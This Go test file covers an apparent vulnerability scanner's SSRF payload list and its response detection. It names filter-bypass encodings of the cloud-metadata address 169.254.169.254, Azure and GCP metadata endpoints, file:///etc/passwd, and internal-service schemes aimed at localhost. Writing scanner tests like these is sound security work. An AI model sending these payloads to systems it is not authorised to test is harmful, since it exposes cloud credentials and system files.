package utils

import (
	"net/http"
	"strings"
	"testing"
)

// The payloads FrameworkSSRFPayloads contributes on top of REcollapse's byte mutations, and the
// property that makes the new cloud-metadata encodings safe to add: they are self-proving and sit
// after every redirect form, so the one-proof-per-signal dedup in ProbeSSRFVector still lets a
// metadata read be reported even on a parameter that also open-redirects.

func ssrfPayloadIndex(list []string, want string) int {
	for i, s := range list {
		if s == want {
			return i
		}
	}
	return -1
}

// The cloud-metadata IP 169.254.169.254 is reached through many encodings a naive SSRF filter does
// not recognise as that address: a single decimal integer, dotted and dotless hex, octal, an
// IPv6-mapped form, a userinfo bypass and nip.io-style names. They were added because only 127.0.0.1
// carried its alternate encodings before, so a block list that stopped the canonical metadata
// address let every one of these through.
func TestMetadataIPEncodingsArePresentAndOrderedAfterRedirectForms(t *testing.T) {
	payloads := FrameworkSSRFPayloads("https://webhook.example/rs0ntoken", "allowed.example")

	// file:///etc/passwd opens the response-proving block, so its index is the boundary every
	// self-proving payload must sit at or after.
	firstProving := ssrfPayloadIndex(payloads, "file:///etc/passwd")
	if firstProving < 0 {
		t.Fatal("the response-proving block must still open with file:///etc/passwd")
	}

	// The redirect / host-confusion forms come FIRST: the scheme-relative webhook form is before the
	// proving block.
	if rel := ssrfPayloadIndex(payloads, "//webhook.example/rs0ntoken"); rel < 0 || rel >= firstProving {
		t.Errorf("redirect forms must precede the proving block (// form at %d, block at %d)", rel, firstProving)
	}

	for _, want := range []string{
		"http://2852039166/latest/meta-data/",
		"http://0xA9FEA9FE/latest/meta-data/",
		"http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
		"http://0251.0376.0251.0376/latest/meta-data/",
		"http://169.254.43518/latest/meta-data/",
		"http://[::ffff:169.254.169.254]/latest/meta-data/",
		"http://0.0.0.0/latest/meta-data/",
		"http://169.254.169.254.nip.io/latest/meta-data/",
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		"http://allowed.example@169.254.169.254/latest/meta-data/",
	} {
		idx := ssrfPayloadIndex(payloads, want)
		if idx < 0 {
			t.Errorf("metadata encoding missing from the payload list: %q", want)
			continue
		}
		if idx < firstProving {
			t.Errorf("metadata payload %q at %d precedes the proving block at %d: a self-proving payload must never come before the redirect forms", want, idx, firstProving)
		}
	}

	// AWS and GCP paths are KEPT, not replaced.
	for _, keep := range []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
	} {
		if ssrfPayloadIndex(payloads, keep) < 0 {
			t.Errorf("the original %q path must be kept alongside the new encodings", keep)
		}
	}

	// THE CANARY PREFIX RULE IS UNTOUCHED. Every response-proving payload proves itself from the
	// response body, so none carries the webhook host or the canary placeholder and none is part of
	// the per-parameter token substring match; nothing added here can make one canary a prefix of
	// another. The tokens themselves are covered by TestNoCanaryTokenIsAPrefixOfAnother.
	for _, p := range payloads[firstProving:] {
		if strings.Contains(p, "webhook.example") {
			t.Errorf("a response-proving payload must not carry the webhook host: %q", p)
		}
		if strings.Contains(p, vectorTokenPlaceholder) {
			t.Errorf("a response-proving payload must not carry the canary placeholder: %q", p)
		}
	}
}

// The extra internal-service schemes are present and self-proving.
func TestExtraInternalServiceSchemesArePresent(t *testing.T) {
	payloads := FrameworkSSRFPayloads("https://webhook.example/rs0ntoken", "allowed.example")
	for _, want := range []string{
		"ftp://127.0.0.1/", "sftp://127.0.0.1/", "ldap://127.0.0.1/", "tftp://127.0.0.1/",
	} {
		if ssrfPayloadIndex(payloads, want) < 0 {
			t.Errorf("extra scheme missing: %q", want)
		}
	}
}

// The Azure metadata payload is only useful if a successful read is recognised in band. Azure IMDS
// always returns an azEnvironment field, which nothing in an ordinary application response carries.
func TestAzureMetadataBodyIsRecognisedAsCloudMetadata(t *testing.T) {
	ok := &http.Response{StatusCode: 200, Header: http.Header{}}
	body := `{"compute":{"azEnvironment":"AzurePublicCloud","name":"vm1","vmId":"d3a","subscriptionId":"s1"}}`
	got := inspectSSRFResponse(ok, body, "webhook.example")
	if got == nil || got.Signal != "cloud-metadata" {
		t.Fatalf("an Azure IMDS document must be recognised as cloud-metadata, got %v", got)
	}
	// A page that merely mentions azure, with no JSON field, must not match.
	if got := inspectSSRFResponse(ok, "<p>our azure environment is great</p>", "webhook.example"); got != nil {
		t.Errorf("a page mentioning azure must not be read as a metadata read: %s", got.Signal)
	}
}
